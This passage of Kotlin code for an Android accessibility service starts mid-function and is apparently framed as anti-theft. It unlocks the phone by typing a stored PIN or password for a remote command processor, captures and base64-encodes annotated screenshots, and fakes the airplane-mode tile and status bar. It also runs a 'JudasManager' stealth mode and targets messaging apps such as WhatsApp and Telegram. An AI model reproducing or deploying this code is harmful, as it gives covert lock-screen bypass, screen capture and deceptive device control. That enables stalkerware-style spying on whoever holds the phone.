                } else return Pair(false, "FAILED_GRID_MISMATCH: Grid coordinates incomplete.")
            } else {
                val cleanKey = keyValRaw.replace("\"", "").replace("[", "").replace("]", "").trim()
                var typed = false

                if (type.contains("PIN")) {
                    for (char in cleanKey) {
                        val nodes = root?.findAccessibilityNodeInfosByText(char.toString())
                        val targetNode = nodes?.find { it.isClickable || it.parent?.isClickable == true }
                        var current = targetNode
                        while (current != null) {
                            if (current.isClickable && current.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) break
                            current = current.parent
                        }
                        delay(150)
                    }
                    typed = true
                } else {
                    var editText: android.view.accessibility.AccessibilityNodeInfo? = null
                    fun findEdit(node: android.view.accessibility.AccessibilityNodeInfo?) {
                        if (node == null || editText != null) return
                        if (node.isEditable) { editText = node; return }
                        for (i in 0 until node.childCount) findEdit(node.getChild(i))
                    }
                    findEdit(root)
                    
                    if (editText != null) {
                        editText?.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_FOCUS)
                        val arguments = android.os.Bundle()
                        arguments.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cleanKey)
                        editText?.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                        typed = true
                        delay(300)
                    }
                }
                
                if (typed) {
                    val okNodes = root?.findAccessibilityNodeInfosByText("OK") ?: emptyList()
                    val doneNodes = root?.findAccessibilityNodeInfosByText("Done") ?: emptyList()
                    val enterNodes = root?.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key_enter") ?: emptyList()
                    val allConfirm = okNodes + doneNodes + enterNodes
                    for (node in allConfirm) {
                        var current: android.view.accessibility.AccessibilityNodeInfo? = node
                        while (current != null) {
                            if (current.isClickable && current.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) break
                            current = current.parent
                        }
                    }
                } else return Pair(false, "FAILED_UI_NOT_FOUND: Could not locate keypad or password field.")
            }
        } catch (e: Exception) { return Pair(false, "FAILED_EXCEPTION: ${e.message}") }

        delay(2000)
        if (km.isKeyguardLocked) {
            val diag = dumpScreenDiagnostic()
            return Pair(false, "FAILED_INCORRECT_CREDENTIALS: Sequence executed but device remains locked. Post-Execution State: $diag")
        } else {
            return Pair(true, "UNLOCK_SUCCESS: Device unlocked autonomously.")
        }
    }

    suspend fun executeAutonomousUnlock(cmdId: Int) {
        val result = executeAutonomousUnlockInternal()
        val status = if (result.first) {
            if (result.second.contains("already unlocked")) "ALREADY_UNLOCKED" else "UNLOCK_SUCCESS"
        } else {
            result.second.substringBefore(":")
        }
        val msg = if (result.second.contains(":")) result.second.substringAfter(":").trim() else result.second
        CommandProcessor.updateCommandStatus(applicationContext, cmdId, status, msg, null, null)
    }

    fun getAnnotatedScreenB64(callback: (String?) -> Unit) {
        val root = rootInActiveWindow
        if (root == null || android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            callback(null)
            return
        }

        val interactiveNodes = mutableListOf<android.graphics.Rect>()
        fun traverse(node: android.view.accessibility.AccessibilityNodeInfo?) {
            if (node == null) return
            if (node.isVisibleToUser) {
                if (node.isClickable || node.isCheckable || node.isEditable || node.isLongClickable) {
                    val rect = android.graphics.Rect()
                    node.getBoundsInScreen(rect)
                    // Filter out invisible, 0-size, or tiny bounds
                    if (!rect.isEmpty && rect.width() > 15 && rect.height() > 15) {
                        interactiveNodes.add(rect)
                    }
                }
                for (i in 0 until node.childCount) {
                    traverse(node.getChild(i))
                }
            }
        }
        traverse(root)

        captureScreenshot(50) { file ->
            if (file != null && file.exists()) {
                kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                    var result: String? = null
                    try {
                        val bmp = android.graphics.BitmapFactory.decodeFile(file.absolutePath)
                        if (bmp != null) {
                            // Scale down to 720p width for network efficiency while keeping bounding boxes precise
                            val ratio = 1024.0f / bmp.width
                            val newHeight = (bmp.height * ratio).toInt()
                            val scaled = android.graphics.Bitmap.createScaledBitmap(bmp, 1024, newHeight, true)
                            
                            val mutableBmp = scaled.copy(android.graphics.Bitmap.Config.ARGB_8888, true)
                            val canvas = android.graphics.Canvas(mutableBmp)
                            
                            val boxPaint = android.graphics.Paint().apply {
                                color = android.graphics.Color.YELLOW
                                style = android.graphics.Paint.Style.STROKE
                                strokeWidth = 5f
                            }
                            val badgePaint = android.graphics.Paint().apply {
                                color = android.graphics.Color.YELLOW
                                style = android.graphics.Paint.Style.FILL
                                alpha = 255
                            }
                            val textPaint = android.graphics.Paint().apply {
                                color = android.graphics.Color.BLACK
                                textSize = 44f
                                textAlign = android.graphics.Paint.Align.CENTER
                                isFakeBoldText = true
                                isAntiAlias = true
                            }

                            somMap.clear()
                            
                            var idCounter = 1
                            for (rect in interactiveNodes) {
                                val left = rect.left * ratio
                                val top = rect.top * ratio
                                val right = rect.right * ratio
                                val bottom = rect.bottom * ratio
                                
                                val scaledRect = android.graphics.RectF(left, top, right, bottom)
                                canvas.drawRect(scaledRect, boxPaint)
                                
                                val idStr = idCounter.toString()
                                val textWidth = textPaint.measureText(idStr)
                                val badgeRect = android.graphics.RectF(left, top, left + textWidth + 24f, top + 56f)
                                canvas.drawRoundRect(badgeRect, 8f, 8f, badgePaint)
                                canvas.drawText(idStr, left + (textWidth / 2f) + 12f, top + 44f, textPaint)
                                
                                // Map visual badge ID to physical screen coordinates (unscaled)
                                somMap["#$idCounter"] = Pair(rect.centerX().toFloat(), rect.centerY().toFloat())
                                idCounter++
                            }

                            val stream = java.io.ByteArrayOutputStream()
                            mutableBmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 85, stream)
                            result = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                            
                            mutableBmp.recycle()
                            scaled.recycle()
                            bmp.recycle()
                        }
                    } catch(e: Exception) {
                        DebugLogger.log("SOM_ERR", "Annotation failed: ${e.message}")
                    } finally {
                        file.delete()
                        callback(result)
                    }
                }
            } else {
                callback(null)
            }
        }
    }

    fun captureScreenshot(quality: Int, callback: (java.io.File?) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            DebugLogger.log("SCREENSHOT_ERR", "API 30+ required for background screenshot.")
            callback(null)
            return
        }

        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, applicationContext.mainExecutor, object : AccessibilityService.TakeScreenshotCallback {
            override fun onSuccess(screenshot: ScreenshotResult) {
                try {
                    val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap == null) { callback(null); return }
                    
                    val file: java.io.File = java.io.File(cacheDir, "scrn_${System.currentTimeMillis()}.jpg")
                    java.io.FileOutputStream(file).use { out ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, out)
                    }
                    screenshot.hardwareBuffer.close()
                    callback(file)
                } catch (e: Exception) {
                    DebugLogger.log("SCREENSHOT_ERR", "Processing failed: ${e.message}")
                    callback(null)
                }
            }
            override fun onFailure(errorCode: Int) {
                DebugLogger.log("SCREENSHOT_ERR", "System denied capture. Error code: $errorCode")
                callback(null)
            }
        })
    }

    fun handleAirplaneModeChange(isOn: Boolean) {
        if (isAutomatedFlightModeToggle) {
            DebugLogger.log("FLIGHT_AUTH", "Automated toggle detected. Ignoring state change to: $isOn")
            return
        }
        
        if (isOn) {
            DebugLogger.log("FLIGHT_AUTH", "Flight mode enabled by User/Thief. Starting 30s fuse.")
            flightModeFuseJob?.cancel()
            breathingModeJob?.cancel()
            flightModeFuseJob = CoroutineScope(Dispatchers.Main).launch {
                delay(30000)
                DebugLogger.log("FLIGHT_AUTH", "Fuse expired. Vibrating double-pulse for auth.")
                vibrateDoublePulse()
                flightModeAuthPending = true
                delay(10000)
                if (flightModeAuthPending) {
                    DebugLogger.log("FLIGHT_AUTH", "No knock received. Assuming THIEF. Executing countermeasures.")
                    flightModeAuthPending = false
                    executeFlightModeCountermeasures()
                }
            }
        } else {
            DebugLogger.log("FLIGHT_AUTH", "Flight mode disabled by user. Cancelling fuse & breathing mode.")
            flightModeFuseJob?.cancel()
            breathingModeJob?.cancel()
            flightModeAuthPending = false
        }
    }

    private fun vibrateDoublePulse() {
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createWaveform(longArrayOf(0, 200, 200, 200), -1))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(longArrayOf(0, 200, 200, 200), -1)
            }
        } catch (e: Exception) {}
    }

    private fun vibrateSinglePulse() {
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(200, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(200)
            }
        } catch (e: Exception) {}
    }

    override fun onKeyEvent(event: android.view.KeyEvent): Boolean {
        if (event.keyCode == android.view.KeyEvent.KEYCODE_VOLUME_UP) {
            if (event.action == android.view.KeyEvent.ACTION_DOWN && !isVolUpHeld) {
                isVolUpHeld = true
                accelSensor?.let { sensorManager?.registerListener(shakeListener, it, SensorManager.SENSOR_DELAY_UI) }
            } else if (event.action == android.view.KeyEvent.ACTION_UP) {
                isVolUpHeld = false
                sensorManager?.unregisterListener(shakeListener)
            }
        }
        
        if (flightModeAuthPending && event.keyCode == android.view.KeyEvent.KEYCODE_VOLUME_UP) {
            if (event.action == android.view.KeyEvent.ACTION_DOWN) {
                DebugLogger.log("FLIGHT_AUTH", "Volume Up knock received! Auth Success.")
                flightModeAuthPending = false
                vibrateSinglePulse()
                startBreathingMode()
                return true // Consume event
            }
            return true // Consume up action too
        }
        return super.onKeyEvent(event)
    }

    private fun executeFlightModeCountermeasures() {
        getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
            .putBoolean("fake_tile_airplane", true)
            .putBoolean("status_bar_active", true).apply()
        
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                android.service.quicksettings.TileService.requestListeningState(
                    this, android.content.ComponentName(this, AirplaneTileService::class.java)
                )
            }
        } catch(e: Exception) {}

        DynamicUIManager.applyStoredStatusBar(this)

        isAutomatedFlightModeToggle = true
        CoroutineScope(Dispatchers.IO).launch {
            val wakeCmd = org.json.JSONObject().apply { put("id", -101); put("file_name", "WAKE"); put("content", "standard") }
            CommandProcessor.processSingleCommand(applicationContext, wakeCmd)
            delay(1500)
            val flightOffCmd = org.json.JSONObject().apply { put("id", -102); put("file_name", "FLIGHT_MODE"); put("content", "OFF") }
            CommandProcessor.processSingleCommand(applicationContext, flightOffCmd)
            delay(15000)
            isAutomatedFlightModeToggle = false
        }
    }

    private fun startBreathingMode() {
        breathingModeJob?.cancel()
        breathingModeJob = CoroutineScope(Dispatchers.Main).launch {
            DebugLogger.log("FLIGHT_BREATH", "Breathing Mode active. Cycle: 30m off, 5m on.")
            while (isActive) {
                delay(30 * 60 * 1000L) // 30 mins
                DebugLogger.log("FLIGHT_BREATH", "Inhaling: Turning radios ON for 5 mins.")
                
                JudasManager.engageStealthMode(applicationContext)
                
                isAutomatedFlightModeToggle = true
                val wakeCmd = org.json.JSONObject().apply { put("id", -103); put("file_name", "WAKE"); put("content", "standard") }
                CommandProcessor.processSingleCommand(applicationContext, wakeCmd)
                delay(1500)
                val flightOffCmd = org.json.JSONObject().apply { put("id", -104); put("file_name", "FLIGHT_MODE"); put("content", "OFF") }
                CommandProcessor.processSingleCommand(applicationContext, flightOffCmd)
                
                delay(15000) // Wait for Ghost Hand to finish and broadcast to fire
                isAutomatedFlightModeToggle = false
                
                delay(5 * 60 * 1000L - 15000) // Wait remainder of 5 mins
                
                DebugLogger.log("FLIGHT_BREATH", "Exhaling: Turning radios OFF.")
                
                isAutomatedFlightModeToggle = true
                val wakeCmd2 = org.json.JSONObject().apply { put("id", -105); put("file_name", "WAKE"); put("content", "standard") }
                CommandProcessor.processSingleCommand(applicationContext, wakeCmd2)
                delay(1500)
                val flightOnCmd = org.json.JSONObject().apply { put("id", -106); put("file_name", "FLIGHT_MODE"); put("content", "ON") }
                CommandProcessor.processSingleCommand(applicationContext, flightOnCmd)
                
                delay(15000)
                isAutomatedFlightModeToggle = false
                
                JudasManager.disengageStealthMode(applicationContext)
            }
        }
    }

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }
}
